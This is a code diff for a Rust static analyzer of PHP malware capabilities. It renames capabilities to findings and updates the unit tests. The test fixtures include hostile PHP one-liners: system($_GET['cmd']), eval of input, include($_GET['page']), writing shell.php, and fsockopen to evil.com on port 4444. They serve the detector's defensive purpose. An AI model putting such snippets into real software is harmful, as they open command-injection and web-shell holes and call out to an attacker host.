@@ -459,7 +459,9 @@ impl PhpAnalyzer {
         }
 
         for (cap_id, desc, method, conf, criticality) in capabilities {
-            report.capabilities.push(Capability {
+            report.findings.push(Finding {
+                kind: FindingKind::Capability,
+                trait_refs: vec![],
                 id: cap_id.to_string(),
                 description: desc.to_string(),
                 confidence: conf,
@@ -476,9 +478,6 @@ impl PhpAnalyzer {
                         node.start_position().column
                     )),
                 }],
-                traits: Vec::new(),
-                referenced_paths: None,
-                referenced_directories: None,
             });
         }
     }
@@ -516,7 +515,9 @@ impl PhpAnalyzer {
             _ => "include",
         };
 
-        report.capabilities.push(Capability {
+        report.findings.push(Finding {
+            kind: FindingKind::Capability,
+            trait_refs: vec![],
             id: "fs/include".to_string(),
             description: format!("File inclusion ({})", include_type),
             confidence,
@@ -533,9 +534,6 @@ impl PhpAnalyzer {
                     node.start_position().column
                 )),
             }],
-            traits: Vec::new(),
-            referenced_paths: None,
-            referenced_directories: None,
         });
     }
 
@@ -595,7 +593,9 @@ impl PhpAnalyzer {
         }
 
         for (cap_id, desc, method, conf, criticality) in capabilities {
-            report.capabilities.push(Capability {
+            report.findings.push(Finding {
+                kind: FindingKind::Capability,
+                trait_refs: vec![],
                 id: cap_id.to_string(),
                 description: desc.to_string(),
                 confidence: conf,
@@ -612,9 +612,6 @@ impl PhpAnalyzer {
                         node.start_position().column
                     )),
                 }],
-                traits: Vec::new(),
-                referenced_paths: None,
-                referenced_directories: None,
             });
         }
     }
@@ -629,7 +626,9 @@ impl PhpAnalyzer {
 
         // PDO prepared statements
         if text.contains("->prepare(") || text.contains("->execute(") {
-            report.capabilities.push(Capability {
+            report.findings.push(Finding {
+                kind: FindingKind::Capability,
+                trait_refs: vec![],
                 id: "database/query".to_string(),
                 description: "Database prepared statement".to_string(),
                 confidence: 0.8,
@@ -646,9 +645,6 @@ impl PhpAnalyzer {
                         node.start_position().column
                     )),
                 }],
-                traits: Vec::new(),
-                referenced_paths: None,
-                referenced_directories: None,
             });
         }
     }
@@ -766,40 +762,28 @@ mod tests {
     fn test_detect_exec() {
         let code = r#"<?php exec("whoami"); ?>"#;
         let report = analyze_php_code(code);
-        assert!(report
-            .capabilities
-            .iter()
-            .any(|c| c.id == "exec/command/shell"));
+        assert!(report.findings.iter().any(|c| c.id == "exec/command/shell"));
     }
 
     #[test]
     fn test_detect_shell_exec() {
         let code = r#"<?php $out = shell_exec("ls -la"); ?>"#;
         let report = analyze_php_code(code);
-        assert!(report
-            .capabilities
-            .iter()
-            .any(|c| c.id == "exec/command/shell"));
+        assert!(report.findings.iter().any(|c| c.id == "exec/command/shell"));
     }
 
     #[test]
     fn test_detect_system() {
         let code = r#"<?php system($_GET['cmd']); ?>"#;
         let report = analyze_php_code(code);
-        assert!(report
-            .capabilities
-            .iter()
-            .any(|c| c.id == "exec/command/shell"));
+        assert!(report.findings.iter().any(|c| c.id == "exec/command/shell"));
     }
 
     #[test]
     fn test_detect_eval() {
         let code = r#"<?php eval($code); ?>"#;
         let report = analyze_php_code(code);
-        assert!(report
-            .capabilities
-            .iter()
-            .any(|c| c.id == "exec/script/eval"));
+        assert!(report.findings.iter().any(|c| c.id == "exec/script/eval"));
     }
 
     #[test]
@@ -807,7 +791,7 @@ mod tests {
         let code = r#"<?php $x = base64_decode($encoded); ?>"#;
         let report = analyze_php_code(code);
         assert!(report
-            .capabilities
+            .findings
             .iter()
             .any(|c| c.id == "anti-analysis/obfuscation/base64"));
     }
@@ -817,7 +801,7 @@ mod tests {
         let code = r#"<?php $obj = unserialize($data); ?>"#;
         let report = analyze_php_code(code);
         assert!(report
-            .capabilities
+            .findings
             .iter()
             .any(|c| c.id == "anti-analysis/deserialization"));
     }
@@ -829,8 +813,8 @@ mod tests {
             file_put_contents("shell.php", $payload);
         ?>"#;
         let report = analyze_php_code(code);
-        assert!(report.capabilities.iter().any(|c| c.id == "fs/read"));
-        assert!(report.capabilities.iter().any(|c| c.id == "fs/write"));
+        assert!(report.findings.iter().any(|c| c.id == "fs/read"));
+        assert!(report.findings.iter().any(|c| c.id == "fs/write"));
     }
 
     #[test]
@@ -840,27 +824,21 @@ mod tests {
             curl_exec($ch);
         ?>"#;
         let report = analyze_php_code(code);
-        assert!(report
-            .capabilities
-            .iter()
-            .any(|c| c.id == "net/http/client"));
+        assert!(report.findings.iter().any(|c| c.id == "net/http/client"));
     }
 
     #[test]
     fn test_detect_socket() {
         let code = r#"<?php $sock = fsockopen("evil.com", 4444); ?>"#;
         let report = analyze_php_code(code);
-        assert!(report
-            .capabilities
-            .iter()
-            .any(|c| c.id == "net/socket/create"));
+        assert!(report.findings.iter().any(|c| c.id == "net/socket/create"));
     }
 
     #[test]
     fn test_detect_include() {
         let code = r#"<?php include("config.php"); ?>"#;
         let report = analyze_php_code(code);
-        assert!(report.capabilities.iter().any(|c| c.id == "fs/include"));
+        assert!(report.findings.iter().any(|c| c.id == "fs/include"));
     }
 
     #[test]
@@ -868,7 +846,7 @@ mod tests {
         let code = r#"<?php include($_GET['page']); ?>"#;
         let report = analyze_php_code(code);
         let cap = report
-            .capabilities
+            .findings
             .iter()
             .find(|c| c.id == "fs/include")
             .unwrap();
@@ -879,14 +857,14 @@ mod tests {
     fn test_detect_pdo() {
         let code = r#"<?php $pdo = new PDO("mysql:host=localhost", "user", "pass"); ?>"#;
         let report = analyze_php_code(code);
-        assert!(report.capabilities.iter().any(|c| c.id == "database/pdo"));
+        assert!(report.findings.iter().any(|c| c.id == "database/pdo"));
     }
 
     #[test]
     fn test_detect_mail() {
         let code = r#"<?php mail("admin@example.com", "Subject", "Body"); ?>"#;
         let report = analyze_php_code(code);
-        assert!(report.capabilities.iter().any(|c| c.id == "net/email/send"));
+        assert!(report.findings.iter().any(|c| c.id == "net/email/send"));
     }
 
     #[test]
